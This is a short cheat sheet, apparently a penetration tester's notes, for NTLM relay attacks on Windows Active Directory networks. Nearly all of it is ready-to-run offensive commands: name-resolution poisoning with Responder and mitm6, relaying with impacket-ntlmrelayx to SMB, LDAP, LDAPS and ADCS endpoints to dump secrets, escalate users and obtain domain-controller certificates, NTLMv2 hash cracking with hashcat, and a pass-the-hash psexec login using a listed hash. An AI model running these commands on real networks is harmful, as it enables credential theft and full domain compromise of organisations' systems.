# NTLM Relay
```powershell
// Check SMB Signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

// Run Responder
responder -I eth0 -dwv
OR
// IPv6 Poisining
mitm6 -i eth0 -d oxsium.local

// Relay to SMB (dump SAM / secrets, deploy a shell)
impacket-ntlmrelayx -tf targets.txt -smb2support

// Relay to LDAP (dump domain objects, abuse ACLs)
impacket-ntlmrelayx -t ldap://dc01.targetdomain.local --no-da --no-acl --escalate-user attackercontrolled

// Relay to LDAPS for Resource-Based Constrained Delegation (RBCD) abuse
impacket-ntlmrelayx -t ldaps://dc01.targetdomain.local --delegate-access

// Relay to ADCS HTTP endpoint (ESC8 — request a certificate as the victim)
impacket-ntlmrelayx -t http://ca-server/certsrv/certfnsh.asp --adcs --template DomainController
```

# Quick Reference
```powershell
# Check SMB signing status on a target
crackmapexec smb <target> --gen-relay-list relay_targets.txt

# Capture hashes only (no relay)
responder -I eth0

# Crack captured NTLMv2 hash
hashcat -m 5600 hash.txt wordlist.txt

# Full relay + secrets dump in one go
ntlmrelayx.py -tf targets.txt -smb2support -socks

impacket-psexec -hashes :7c331519c975bba9f0aba84a99d003b0 Administrator@192.168.0.199
```
